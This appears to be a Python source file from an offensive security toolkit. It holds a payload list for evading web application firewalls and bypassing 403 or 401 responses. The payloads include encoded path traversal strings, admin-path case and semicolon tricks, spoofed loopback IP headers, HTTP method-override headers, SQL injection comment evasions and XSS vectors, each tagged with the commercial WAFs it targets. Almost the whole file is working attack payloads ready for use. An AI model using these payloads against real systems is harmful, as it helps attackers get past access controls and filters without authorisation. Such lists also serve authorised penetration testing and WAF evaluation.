"""
Bypass payloads — WAF evasion, 403/401 bypass, and filter bypass techniques.
NIM fast-path: set ONEINFINITY_NIM_BYPASS=1 to use compiled Nim binary.
"""
from __future__ import annotations
import os as _os
if _os.environ.get('ONEINFINITY_NIM_BYPASS', '0') == '1':
    try:
        from oneinfinity.infra.nim_runner import run_nim_binary as _run_nim
        def generate_bypass_payloads(target='/admin'):  # type: ignore[misc]
            """Generate 403/WAF bypass variants via compiled Nim binary."""
            return _run_nim('oi-bypass-gen', [f'--target={target}'])
    except Exception:
        pass  # fall through to Python baseline

from oneinfinity.arsenal.context_matcher import Payload

_ALL_WAFS = ["cloudflare", "akamai", "aws", "imperva", "f5", "fortinet"]

BYPASS_PAYLOADS = [
    # ── URL encoding ──────────────────────────────────────────────────────────
    Payload("%2e%2e%2f",           vuln_type="bypass", waf_bypasses=_ALL_WAFS, tags=["url-encoding","path-traversal"]),
    Payload("%252e%252e%252f",     vuln_type="bypass", waf_bypasses=_ALL_WAFS, tags=["double-encode","path-traversal"]),
    Payload("..%c0%af",            vuln_type="bypass", waf_bypasses=["f5","imperva"], tags=["utf8-overlong"]),
    Payload("%ef%bc%8f",           vuln_type="bypass", waf_bypasses=_ALL_WAFS, tags=["unicode-slash"]),
    Payload("%09",                  vuln_type="bypass", waf_bypasses=["cloudflare","akamai"], tags=["tab-encoding"]),
    # ── Admin/path case variations ────────────────────────────────────────────
    Payload("/ADMIN/",             vuln_type="bypass", waf_bypasses=_ALL_WAFS, tags=["case","admin"]),
    Payload("/Admin/",             vuln_type="bypass", waf_bypasses=_ALL_WAFS, tags=["case","admin"]),
    Payload("/aDmIn/",             vuln_type="bypass", waf_bypasses=_ALL_WAFS, tags=["case","admin"]),
    Payload("/admin;/",            vuln_type="bypass", waf_bypasses=["cloudflare","akamai"], tags=["semicolon"]),
    Payload("/admin..;/",          vuln_type="bypass", waf_bypasses=["cloudflare"], tags=["path-param"]),
    # ── Path traversal bypass ─────────────────────────────────────────────────
    Payload("/./admin/",           vuln_type="bypass", waf_bypasses=_ALL_WAFS, tags=["dot-segment"]),
    Payload("//admin//",           vuln_type="bypass", waf_bypasses=_ALL_WAFS, tags=["double-slash"]),
    Payload("/admin/%20",          vuln_type="bypass", waf_bypasses=["cloudflare"], tags=["space-encode"]),
    Payload("/admin#",             vuln_type="bypass", waf_bypasses=["cloudflare","akamai"], tags=["fragment"]),
    # ── HTTP method override ──────────────────────────────────────────────────
    Payload("X-HTTP-Method-Override: DELETE",  vuln_type="bypass", tags=["method-override","header"]),
    Payload("X-HTTP-Method-Override: PUT",     vuln_type="bypass", tags=["method-override","header"]),
    Payload("X-Method-Override: DELETE",       vuln_type="bypass", tags=["method-override","header"]),
    Payload("_method=DELETE",                  vuln_type="bypass", tags=["method-override","param"]),
    # ── IP-based host bypass ──────────────────────────────────────────────────
    Payload("X-Forwarded-For: 127.0.0.1",      vuln_type="bypass", waf_bypasses=_ALL_WAFS, tags=["ip-bypass","header"]),
    Payload("X-Forwarded-For: 0.0.0.0",        vuln_type="bypass", waf_bypasses=_ALL_WAFS, tags=["ip-bypass","header"]),
    Payload("X-Forwarded-For: ::1",            vuln_type="bypass", waf_bypasses=_ALL_WAFS, tags=["ip-bypass","header","ipv6"]),
    Payload("X-Real-IP: 127.0.0.1",            vuln_type="bypass", waf_bypasses=_ALL_WAFS, tags=["ip-bypass","header"]),
    Payload("X-Originating-IP: 127.0.0.1",    vuln_type="bypass", waf_bypasses=_ALL_WAFS, tags=["ip-bypass","header"]),
    Payload("X-Remote-IP: 127.0.0.1",          vuln_type="bypass", waf_bypasses=_ALL_WAFS, tags=["ip-bypass","header"]),
    Payload("X-Remote-Addr: 127.0.0.1",        vuln_type="bypass", waf_bypasses=_ALL_WAFS, tags=["ip-bypass","header"]),
    Payload("X-Client-IP: 127.0.0.1",          vuln_type="bypass", waf_bypasses=_ALL_WAFS, tags=["ip-bypass","header"]),
    # ── Cloudflare-specific ───────────────────────────────────────────────────
    Payload("CF-Connecting-IP: 127.0.0.1",     vuln_type="bypass", waf_bypasses=["cloudflare"], tags=["cloudflare","ip-bypass"]),
    Payload("True-Client-IP: 127.0.0.1",       vuln_type="bypass", waf_bypasses=["cloudflare","akamai"], tags=["ip-bypass","header"]),
    # ── AWS WAF bypass ────────────────────────────────────────────────────────
    Payload("X-Amzn-Trace-Id: 127.0.0.1",     vuln_type="bypass", waf_bypasses=["aws"], tags=["aws","ip-bypass"]),
    # ── SQLi WAF bypass encoding ──────────────────────────────────────────────
    Payload("/**/OR/**/1=1--",                 vuln_type="bypass", waf_bypasses=_ALL_WAFS, tags=["sqli","comment-bypass"]),
    Payload("' /*!OR*/ '1'='1",                vuln_type="bypass", waf_bypasses=["cloudflare","akamai"], tags=["sqli","mysql-comment"]),
    Payload("1;SELECT%09*%09FROM",             vuln_type="bypass", waf_bypasses=_ALL_WAFS, tags=["sqli","tab-encode"]),
    # ── XSS WAF bypass ────────────────────────────────────────────────────────
    Payload("<img/src=x onerror=alert(1)>",    vuln_type="bypass", waf_bypasses=_ALL_WAFS, tags=["xss","slash"]),
    Payload("<svg/onload=alert(1)>",           vuln_type="bypass", waf_bypasses=["cloudflare"], tags=["xss","svg"]),
    Payload("<details/open/ontoggle=alert(1)>",vuln_type="bypass", waf_bypasses=_ALL_WAFS, tags=["xss","html5"]),
    Payload("javascript&#x3A;alert(1)",        vuln_type="bypass", waf_bypasses=_ALL_WAFS, tags=["xss","html-entity"]),
    Payload("`-alert(1)-`",                    vuln_type="bypass", waf_bypasses=["cloudflare","imperva"], tags=["xss","backtick"]),
    # ── Content-Type bypass ───────────────────────────────────────────────────
    Payload("Content-Type: application/x-www-form-urlencoded", vuln_type="bypass", tags=["content-type","header"]),
    Payload("Content-Type: text/plain",        vuln_type="bypass", waf_bypasses=_ALL_WAFS, tags=["content-type","header"]),
]
